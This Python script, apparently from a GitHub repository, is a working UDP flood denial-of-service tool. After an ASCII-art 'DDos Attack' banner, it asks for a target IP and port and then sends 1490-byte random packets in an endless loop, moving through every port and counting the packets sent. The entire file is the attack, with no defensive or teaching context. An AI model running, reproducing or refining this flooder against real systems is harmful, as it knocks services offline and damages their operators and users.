import sys
import os
import time
import socket
import secrets
from datetime import datetime

# Attack settings
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = secrets.token_bytes(1490)

# Initial interface
os.system("clear")
os.system("figlet 'DDos Attack'")

# ASCII Art in the menu
print("""
-------------------------------------------------------------------------------------------------
|                                                                                                 |
|                                                                                                 |
|      ________   ___  ___  ___  __    _______   ________  ________  ________  ________           |
|     |\\   ___  \\|\\  \\|\\  \\|\\  \\|\\  \\ |\\  ___ \\ |\\   ___ \\|\\   ___ \\|\\   __  \\|\\   ____\\          |
|     \\ \\  \\\\ \\  \\ \\  \\\\  \\ \\  \\/  /|\\ \\   __/|\\ \\  \\_|\\ \\ \\  \\_|\\ \\ \\  \\\\  \\ \\  \\___|_         |
|      \\ \\  \\\\ \\  \\ \\  \\\\ \\ \\   ___  \\ \\  \\_|/_\\ \\  \\ \\ \\ \\ \\  \\\\  \\ \\ \\_____  \\        |
|       \\ \\  \\\\ \\  \\ \\  \\\\ \\ \\  \\\\\  \\  \\  \\_|\\ \\ \\  \\_\\ \\ \\  \\_\\  \\|____|\\  \\       |
|        \\ \\__\\\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\_______\\ \\_______\\ \\_______\\____\\_\\  \\      |
|         \\|__| \\|__|\\|_______|\\|__| \\|__|\\|_______|\\|_______|\\|_______|\\|_______|\\_________\\     |
|                                                                                \\|_________|     |
|                                                                                                 |
'-------------------------------------------------------------------------------------------------'
""")

print("Author   : Laila19")
print("GitHub   : https://github.com/lailacypher")
print()

# User input
ip = input("Target IP   : ")
try:
    port = int(input("Port        : "))
except ValueError:
    print("Error: Port must be an integer.")
    sys.exit(1)

# IP validation
try:
    socket.inet_aton(ip)
except socket.error:
    print("Error: Invalid IP address.")
    sys.exit(1)

# Loading animation
os.system("clear")
os.system("figlet Attack Starting")
progress = ["[                    ] 0% ", "[=====               ] 25%", "[==========          ] 50%", "[===============     ] 75%", "[====================] 100%"]
for step in progress:
    print(step)
    time.sleep(1)

# Start the attack
sent = 0
try:
    while True:
        sock.sendto(data, (ip, port))
        sent += 1
        port += 1
        print(f"Sent {sent} packets to {ip} through port {port}")
        if port > 65535:
            port = 1
except KeyboardInterrupt:
    print("\nAttack interrupted by the user.")
    sock.close()
    sys.exit(0)
except Exception as e:
    print(f"\nError: {e}")
    sock.close()
    sys.exit(1)
